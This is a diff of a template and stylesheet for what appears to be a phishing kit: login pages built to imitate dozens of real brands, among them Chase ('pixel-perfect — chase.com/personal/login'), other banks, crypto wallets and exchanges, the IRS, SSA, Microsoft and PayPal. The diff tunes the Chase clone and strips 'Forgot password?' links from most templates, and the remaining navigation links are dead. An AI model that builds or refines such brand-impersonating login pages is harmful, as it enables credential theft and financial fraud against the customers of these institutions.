@@ -703,13 +703,20 @@
   body.brand-mexc button { background:#00C087; border-radius:4px; background-image:none; font-weight:600; }
 
   /* ── Banks ── */
-  body.brand-jpmorganchase { background:#fff; color:#000; }
-  body.brand-jpmorganchase .auth { background:#fff; border:1px solid #d4dae3; border-radius:4px; box-shadow:0 2px 8px rgba(0,0,0,.1); }
-  body.brand-jpmorganchase h1 { color:#000; font-weight:400; }
-  body.brand-jpmorganchase input { background:#fff; border:1px solid #8a8a8a; border-radius:3px; color:#000; }
-  body.brand-jpmorganchase input:focus { border-color:#005EB8; box-shadow:none; background:#fff; }
-  body.brand-jpmorganchase button { background:#005EB8; border-radius:3px; background-image:none; font-weight:700; }
+  /* JPMorgan Chase: pixel-perfect — chase.com/personal/login */
+  body.brand-jpmorganchase { background:#f5f5f5; color:#111; font-family:Arial,Helvetica,sans-serif; }
+  body.brand-jpmorganchase .auth { background:#fff; border:1px solid #cccccc; border-radius:4px; box-shadow:0 1px 4px rgba(0,0,0,.1); max-width:380px; padding:36px 32px 28px; }
+  body.brand-jpmorganchase .logo-svg { display:block; margin-bottom:20px; }
+  body.brand-jpmorganchase h1 { color:#111; font-weight:700; font-size:1.3rem; text-align:left; margin-bottom:16px; font-family:Arial,sans-serif; }
+  body.brand-jpmorganchase .sub { display:none; }
+  body.brand-jpmorganchase label { display:block; font-size:.875rem; font-weight:700; color:#111; margin-bottom:4px; font-family:Arial,sans-serif; }
+  body.brand-jpmorganchase input { background:#fff; border:1px solid #767676; border-radius:3px; color:#111; font-size:.9rem; padding:10px 12px; height:40px; font-family:Arial,sans-serif; }
+  body.brand-jpmorganchase input:focus { border-color:#005EB8; border-width:2px; box-shadow:none; background:#fff; outline:none; }
+  body.brand-jpmorganchase input::placeholder { color:#767676; }
+  body.brand-jpmorganchase button { background:#005EB8; border-radius:3px; background-image:none; font-weight:700; font-size:.95rem; height:42px; font-family:Arial,sans-serif; }
   body.brand-jpmorganchase button:hover { background:#004fa3; transform:none; filter:none; }
+  body.brand-jpmorganchase .ch-footer { margin-top:14px; font-size:.82rem; color:#111; }
+  body.brand-jpmorganchase .ch-footer a { color:#005EB8; }
 
   body.brand-bankofamerica { background:#e8ecf0; color:#000; }
   body.brand-bankofamerica .auth { background:#fff; border:none; border-radius:4px; box-shadow:0 2px 8px rgba(0,0,0,.15); }
@@ -2091,40 +2098,32 @@
     <% }) %>
     <% /* Kraken: add label above each field + forgot password */ %>
     <button type="submit"><%= pageContent.cta || 'Sign In' %></button>
-    <% if (tpl.key === 'kraken') { %>
-      <a href="#" class="kr-forgot" onclick="return false">Forgot password?</a>
     <% } %>
   </form>
   <% if (tpl.key === 'kraken') { %>
     <div class="kr-footer">Don't have an account? <a href="#" onclick="return false">Sign up</a></div>
   <% } %>
   <% if (tpl.key === 'coinbase') { %>
-    <a href="#" class="cb-forgot" onclick="return false">Forgot password?</a>
     <div class="cb-footer">New to Coinbase? <a href="#" onclick="return false">Create account</a></div>
   <% } %>
   <% if (tpl.key === 'discord') { %>
-    <a href="#" class="dc-forgot" onclick="return false">Forgot your password?</a>
     <div class="dc-footer">Need an account? <a href="#" onclick="return false">Register</a></div>
   <% } %>
   <% if (tpl.key === 'snapchat') { %>
-    <a href="#" class="sc-forgot" onclick="return false">Forgot password?</a>
     <div class="sc-footer">Don't have an account? <a href="#" onclick="return false">Sign up</a></div>
   <% } %>
   <% if (tpl.key === 'metamask') { %>
     <div class="mm-restore"><a href="#" onclick="return false">Restore using Secret Recovery Phrase</a></div>
   <% } %>
   <% if (tpl.key === 'binance') { %>
-    <div class="bn-forgot"><a href="#" onclick="return false">Forgot password?</a></div>
     <div class="bn-footer">Don't have an account? <a href="#" onclick="return false">Register</a></div>
   <% } %>
   <% if (tpl.key === 'microsoft') { %>
     <div class="ms-footer"><a href="#" onclick="return false">No account? Create one!</a></div>
-    <div class="ms-footer" style="margin-top:4px"><a href="#" onclick="return false">Can't access your account?</a></div>
   <% } %>
   <% if (tpl.key === 'microsoftoutlook' || tpl.key === 'outlook') { %>
     <div class="ms-links">
       <a href="#" onclick="return false">No account? Create one!</a>
-      <a href="#" onclick="return false">Can't access your account?</a>
       <a href="#" onclick="return false">Sign-in options</a>
     </div>
   <% } %>
@@ -2148,7 +2147,6 @@
     <div class="sp-footer">Don't have an account? <a href="#" onclick="return false">Sign up for Spotify</a></div>
   <% } %>
   <% if (tpl.key === 'facebook') { %>
-    <a href="#" onclick="return false" style="display:block;text-align:center;font-size:.88rem;color:#1877F2;margin-top:12px;font-weight:600">Forgot password?</a>
     <div style="margin-top:16px;padding-top:14px;border-top:1px solid #ddd;text-align:center"><a href="#" onclick="return false" style="background:#42b72a;color:#fff;padding:12px 20px;border-radius:6px;font-size:.94rem;font-weight:600;text-decoration:none">Create new account</a></div>
   <% } %>
   <% if (tpl.key === 'instagram') { %>
@@ -2158,137 +2156,101 @@
     <div style="margin-top:14px;text-align:center;font-size:.8rem;color:#5f6368"><a href="#" onclick="return false" style="color:#1a73e8">Not your computer? Use a private browsing window to sign in.</a></div>
   <% } %>
   <% if (tpl.key === 'paypal') { %>
-    <div style="margin-top:12px;text-align:center;font-size:.85rem;color:#6c7378"><a href="#" onclick="return false" style="color:#0070ba">Forgot email or password?</a></div>
     <div style="margin-top:8px;text-align:center;font-size:.85rem;color:#6c7378">New to PayPal? <a href="#" onclick="return false" style="color:#0070ba;font-weight:600">Sign Up</a></div>
   <% } %>
   <% if (tpl.key === 'twitter' || tpl.key === 'twitterx') { %>
     <div style="margin-top:12px;text-align:center;font-size:.85rem;color:#536471">Don't have an account? <a href="#" onclick="return false" style="color:#1d9bf0">Sign up</a></div>
-    <div style="margin-top:6px;text-align:center;font-size:.83rem;"><a href="#" onclick="return false" style="color:#1d9bf0">Forgot password?</a></div>
   <% } %>
   <% if (tpl.key === 'tiktok') { %>
     <div style="margin-top:12px;text-align:center;font-size:.85rem;color:#aaa">Don't have an account? <a href="#" onclick="return false" style="color:#fe2c55;font-weight:600">Sign up</a></div>
   <% } %>
   <% if (tpl.key === 'linkedin') { %>
     <div style="margin-top:14px;text-align:center;font-size:.85rem;color:#434649">New to LinkedIn? <a href="#" onclick="return false" style="color:#0a66c2;font-weight:600">Join now</a></div>
-    <div style="margin-top:6px;text-align:center;font-size:.82rem;"><a href="#" onclick="return false" style="color:#0a66c2">Forgot password?</a></div>
   <% } %>
-  <% if (tpl.key === 'chase') { %>
-    <div style="margin-top:12px;text-align:center;font-size:.82rem;color:#666"><a href="#" onclick="return false" style="color:#107CC6">Forgot username or password?</a></div>
-    <div style="margin-top:8px;text-align:center;font-size:.82rem;color:#666">Not a Chase customer? <a href="#" onclick="return false" style="color:#107CC6">Open an account</a></div>
+  <% if (tpl.key === 'jpmorganchase') { %>
+    <div class="ch-footer">Not a Chase customer? <a href="#" onclick="return false">Open an account</a></div>
   <% } %>
   <% if (tpl.key === 'wellsfargo') { %>
-    <div style="margin-top:12px;text-align:center;font-size:.82rem;color:#666"><a href="#" onclick="return false" style="color:#D71E28">Forgot username or password?</a></div>
-    <div style="margin-top:8px;text-align:center;font-size:.82rem;color:#666">Not enrolled? <a href="#" onclick="return false" style="color:#D71E28">Enroll in Wells Fargo Online</a></div>
+    <div style="margin-top:8px;font-size:.82rem;color:#666">Not enrolled? <a href="#" onclick="return false" style="color:#D71E28">Enroll in Wells Fargo Online</a></div>
   <% } %>
-  <% if (tpl.key === 'boa' || tpl.key === 'bankofamerica') { %>
-    <div style="margin-top:12px;text-align:center;font-size:.82rem;color:#666"><a href="#" onclick="return false" style="color:#E11B22">Forgot ID or Passcode?</a></div>
-    <div style="margin-top:8px;text-align:center;font-size:.82rem;color:#666">Not enrolled? <a href="#" onclick="return false" style="color:#E11B22">Enroll in Online Banking</a></div>
-  <% } %>
-  <% if (tpl.key === 'qatarair') { %>
-    <div style="margin-top:12px;text-align:center;font-size:.82rem;color:#666"><a href="#" onclick="return false" style="color:#5C0632">Forgot password?</a></div>
-    <div style="margin-top:8px;text-align:center;font-size:.82rem;color:#666">Not a member? <a href="#" onclick="return false" style="color:#5C0632">Join Privilege Club</a></div>
-  <% } %>
-  <% if (tpl.key === 'yahoo') { %>
-    <div style="margin-top:12px;text-align:center;font-size:.85rem;color:#666"><a href="#" onclick="return false" style="color:#6001D2">Forgot password?</a></div>
-    <div style="margin-top:8px;text-align:center;font-size:.83rem;color:#666">Don't have an account? <a href="#" onclick="return false" style="color:#6001D2;font-weight:600">Create account</a></div>
+  <% if (tpl.key === 'bankofamerica') { %>
+    <div style="margin-top:8px;font-size:.82rem;color:#666">Not enrolled? <a href="#" onclick="return false" style="color:#E11B22">Enroll in Online Banking</a></div>
   <% } %>
   <% if (tpl.key === 'github') { %>
-    <div style="margin-top:12px;text-align:center;font-size:.83rem;color:#656d76"><a href="#" onclick="return false" style="color:#0969da">Forgot password?</a></div>
     <div style="margin-top:8px;text-align:center;font-size:.83rem;color:#656d76">New to GitHub? <a href="#" onclick="return false" style="color:#0969da">Create an account</a></div>
   <% } %>
   <% if (tpl.key === 'citibank') { %>
-    <a href="#" class="citi-forgot" onclick="return false">Forgot User ID or Password?</a>
     <div class="citi-footer">Don't have a Citi account? <a href="#" onclick="return false">Apply now</a></div>
   <% } %>
   <% if (tpl.key === 'hsbc') { %>
-    <a href="#" class="hsbc-forgot" onclick="return false">Forgot your username or password?</a>
     <div class="hsbc-footer">Not registered for online banking? <a href="#" onclick="return false">Register now</a></div>
   <% } %>
   <% if (tpl.key === 'barclays') { %>
-    <a href="#" class="barcl-forgot" onclick="return false">Forgotten your details?</a>
     <div class="barcl-footer">Not registered? <a href="#" onclick="return false">Register for Online Banking</a></div>
   <% } %>
   <% if (tpl.key === 'apple') { %>
-    <a href="#" class="ap-forgot" onclick="return false">Forgot Apple ID or password?</a>
     <div class="ap-footer">Don't have an Apple ID? <a href="#" onclick="return false">Create yours now.</a></div>
   <% } %>
   <% if (tpl.key === 'santander') { %>
-    <a href="#" class="san-forgot" onclick="return false">Forgot your Customer ID or Password?</a>
     <div class="san-footer">New to Santander? <a href="#" onclick="return false">Open an account</a></div>
   <% } %>
   <% if (tpl.key === 'tdbank') { %>
-    <a href="#" class="td-forgot" onclick="return false">Forgot username or password?</a>
     <div class="td-footer">New to TD Bank? <a href="#" onclick="return false">Enroll in online banking</a></div>
   <% } %>
   <% if (tpl.key === 'usbank') { %>
-    <a href="#" class="usb-forgot" onclick="return false">Forgot username or password?</a>
     <div class="usb-footer">New to U.S. Bank? <a href="#" onclick="return false">Enroll in online banking</a></div>
   <% } %>
   <% if (tpl.key === 'trustwallet') { %>
-    <a href="#" class="tw-forgot" onclick="return false">Forgot password?</a>
     <div class="tw-footer">Don't have an account? <a href="#" onclick="return false">Create one</a></div>
   <% } %>
   <% if (tpl.key === 'ledger') { %>
-    <a href="#" class="lg-forgot" onclick="return false">Forgot password?</a>
     <div class="lg-footer">Don't have an account? <a href="#" onclick="return false">Create account</a></div>
   <% } %>
   <% if (tpl.key === 'trezor') { %>
-    <a href="#" class="tz-forgot" onclick="return false">Forgot password?</a>
     <div class="tz-footer">No account yet? <a href="#" onclick="return false">Create account</a></div>
   <% } %>
   <% if (tpl.key === 'emirates') { %>
-    <style>body.brand-emirates .em-forgot{display:block;text-align:center;font-size:.82rem;color:#C8102E;margin-top:10px;text-decoration:none}body.brand-emirates .em-footer{margin-top:14px;padding-top:12px;border-top:1px solid #eee;font-size:.78rem;color:#666;text-align:center}body.brand-emirates .em-footer a{color:#C8102E}</style>
-    <a href="#" class="em-forgot" onclick="return false">Forgot your password?</a>
+    <style>body.brand-emirates .em-footer{margin-top:14px;padding-top:12px;border-top:1px solid #eee;font-size:.78rem;color:#666;text-align:center}body.brand-emirates .em-footer a{color:#C8102E}</style>
     <div class="em-footer">New to Emirates? <a href="#" onclick="return false">Join Skywards</a></div>
   <% } %>
   <% if (tpl.key === 'qatarairways') { %>
-    <style>body.brand-qatarairways .qa-forgot{display:block;text-align:center;font-size:.82rem;color:#5C0632;margin-top:10px;text-decoration:none}body.brand-qatarairways .qa-footer{margin-top:14px;padding-top:12px;border-top:1px solid #eee;font-size:.78rem;color:#666;text-align:center}body.brand-qatarairways .qa-footer a{color:#5C0632}body.brand-qatarairways h1{color:#5C0632;font-weight:700}</style>
-    <a href="#" class="qa-forgot" onclick="return false">Forgot your password?</a>
+    <style>body.brand-qatarairways .qa-footer{margin-top:14px;padding-top:12px;border-top:1px solid #eee;font-size:.78rem;color:#666;text-align:center}body.brand-qatarairways .qa-footer a{color:#5C0632}body.brand-qatarairways h1{color:#5C0632;font-weight:700}</style>
     <div class="qa-footer">Not a member? <a href="#" onclick="return false">Join Privilege Club</a></div>
   <% } %>
   <% if (tpl.key === 'irs') { %>
-    <style>body.brand-irs .irs-forgot{display:block;text-align:center;font-size:.82rem;color:#003366;margin-top:10px;text-decoration:none}body.brand-irs .irs-footer{margin-top:14px;padding-top:12px;border-top:1px solid #ddd;font-size:.78rem;color:#555;text-align:center}body.brand-irs .irs-footer a{color:#003366}</style>
-    <a href="#" class="irs-forgot" onclick="return false">Forgot your username or password?</a>
+    <style>body.brand-irs .irs-footer{margin-top:14px;padding-top:12px;border-top:1px solid #ddd;font-size:.78rem;color:#555;text-align:center}body.brand-irs .irs-footer a{color:#003366}</style>
     <div class="irs-footer">Need help? <a href="#" onclick="return false">Contact the IRS</a></div>
   <% } %>
   <% if (tpl.key === 'ssa') { %>
-    <style>body.brand-ssa .ssa-forgot{display:block;text-align:right;font-size:.8rem;color:#0066CC;margin:-4px 0 8px;text-decoration:none}body.brand-ssa .ssa-footer{margin-top:14px;padding-top:12px;border-top:1px solid #ddd;font-size:.78rem;color:#555;text-align:center}body.brand-ssa .ssa-footer a{color:#0066CC}</style>
-    <a href="#" class="ssa-forgot" onclick="return false">Forgot username or password?</a>
+    <style>body.brand-ssa .ssa-footer{margin-top:14px;padding-top:12px;border-top:1px solid #ddd;font-size:.78rem;color:#555;text-align:center}body.brand-ssa .ssa-footer a{color:#0066CC}</style>
     <div class="ssa-footer">Don't have an account? <a href="#" onclick="return false">Create an account</a></div>
   <% } %>
   <% if (tpl.key === 'dmv') { %>
-    <style>body.brand-dmv .dmv-forgot{display:block;text-align:center;font-size:.82rem;color:#1B3A6B;margin-top:10px;text-decoration:none}body.brand-dmv .dmv-footer{margin-top:14px;font-size:.78rem;color:#666;text-align:center}body.brand-dmv .dmv-footer a{color:#1B3A6B}</style>
-    <a href="#" class="dmv-forgot" onclick="return false">Forgot your password?</a>
+    <style>body.brand-dmv .dmv-footer{margin-top:14px;font-size:.78rem;color:#666;text-align:center}body.brand-dmv .dmv-footer a{color:#1B3A6B}</style>
     <div class="dmv-footer">First time? <a href="#" onclick="return false">Create an account</a></div>
   <% } %>
   <% if (tpl.key === 'yahoomail') { %>
-    <style>body.brand-yahoomail .yh-forgot{display:block;text-align:center;font-size:.82rem;color:#6001D2;margin-top:10px;text-decoration:none}body.brand-yahoomail .yh-footer{margin-top:14px;padding-top:12px;border-top:1px solid #eee;font-size:.78rem;color:#666;text-align:center}body.brand-yahoomail .yh-footer a{color:#6001D2}</style>
-    <a href="#" class="yh-forgot" onclick="return false">Forgot password?</a>
+    <style>body.brand-yahoomail .yh-footer{margin-top:14px;padding-top:12px;border-top:1px solid #eee;font-size:.78rem;color:#666;text-align:center}body.brand-yahoomail .yh-footer a{color:#6001D2}</style>
     <div class="yh-footer">Don't have an account? <a href="#" onclick="return false">Create account</a></div>
   <% } %>
   <% if (tpl.key === 'protonmail') { %>
-    <style>body.brand-protonmail .pm-forgot{display:block;text-align:center;font-size:.82rem;color:#8B7CF6;margin-top:10px;text-decoration:none}body.brand-protonmail .pm-footer{margin-top:14px;padding-top:12px;border-top:1px solid #3A3880;font-size:.78rem;color:#aaa;text-align:center}body.brand-protonmail .pm-footer a{color:#8B7CF6}</style>
-    <a href="#" class="pm-forgot" onclick="return false">Forgot your password?</a>
+    <style>body.brand-protonmail .pm-footer{margin-top:14px;padding-top:12px;border-top:1px solid #3A3880;font-size:.78rem;color:#aaa;text-align:center}body.brand-protonmail .pm-footer a{color:#8B7CF6}</style>
     <div class="pm-footer">New to Proton? <a href="#" onclick="return false">Create a free account</a></div>
   <% } %>
   <% if (tpl.key === 'zoom') { %>
-    <style>body.brand-zoom .zm-forgot{display:block;text-align:center;font-size:.82rem;color:#0B5CFF;margin-top:10px;text-decoration:none}body.brand-zoom .zm-footer{margin-top:14px;padding-top:12px;border-top:1px solid #eee;font-size:.78rem;color:#666;text-align:center}body.brand-zoom .zm-footer a{color:#0B5CFF}</style>
-    <a href="#" class="zm-forgot" onclick="return false">Forgot password?</a>
+    <style>body.brand-zoom .zm-footer{margin-top:14px;padding-top:12px;border-top:1px solid #eee;font-size:.78rem;color:#666;text-align:center}body.brand-zoom .zm-footer a{color:#0B5CFF}</style>
     <div class="zm-footer">Don't have an account? <a href="#" onclick="return false">Sign up free</a></div>
   <% } %>
   <% if (tpl.key === 'uber') { %>
-    <style>body.brand-uber .ub-forgot{display:block;text-align:center;font-size:.82rem;color:#aaa;margin-top:10px;text-decoration:none}body.brand-uber .ub-footer{margin-top:14px;padding-top:12px;border-top:1px solid #333;font-size:.78rem;color:#888;text-align:center}body.brand-uber .ub-footer a{color:#aaa}</style>
-    <a href="#" class="ub-forgot" onclick="return false">Forgot your password?</a>
+    <style>body.brand-uber .ub-footer{margin-top:14px;padding-top:12px;border-top:1px solid #333;font-size:.78rem;color:#888;text-align:center}body.brand-uber .ub-footer a{color:#aaa}</style>
     <div class="ub-footer">Don't have an account? <a href="#" onclick="return false">Sign up</a></div>
   <% } %>
   <% if (tpl.key === 'airbnb') { %>
-    <style>body.brand-airbnb .ab-forgot{display:block;text-align:center;font-size:.82rem;color:#FF5A5F;margin-top:10px;text-decoration:none}body.brand-airbnb .ab-footer{margin-top:14px;padding-top:12px;border-top:1px solid #eee;font-size:.78rem;color:#666;text-align:center}body.brand-airbnb .ab-footer a{color:#FF5A5F}</style>
-    <a href="#" class="ab-forgot" onclick="return false">Forgot your password?</a>
+    <style>body.brand-airbnb .ab-footer{margin-top:14px;padding-top:12px;border-top:1px solid #eee;font-size:.78rem;color:#666;text-align:center}body.brand-airbnb .ab-footer a{color:#FF5A5F}</style>
     <div class="ab-footer">Don't have an account? <a href="#" onclick="return false">Sign up</a></div>
   <% } %>
   <% if (tpl.key === 'dropbox') { %>
-    <style>body.brand-dropbox .db-forgot{display:block;text-align:center;font-size:.82rem;color:#0061FF;margin-top:10px;text-decoration:none}body.brand-dropbox .db-footer{margin-top:14px;padding-top:12px;border-top:1px solid #eee;font-size:.78rem;color:#666;text-align:center}body.brand-dropbox .db-footer a{color:#0061FF}</style>
-    <a href="#" class="db-forgot" onclick="return false">Forgot your password?</a>
+    <style>body.brand-dropbox .db-footer{margin-top:14px;padding-top:12px;border-top:1px solid #eee;font-size:.78rem;color:#666;text-align:center}body.brand-dropbox .db-footer a{color:#0061FF}</style>
     <div class="db-footer">Don't have an account? <a href="#" onclick="return false">Create a free account</a></div>
   <% } %>
   <% if (tpl.key === 'google') { %>
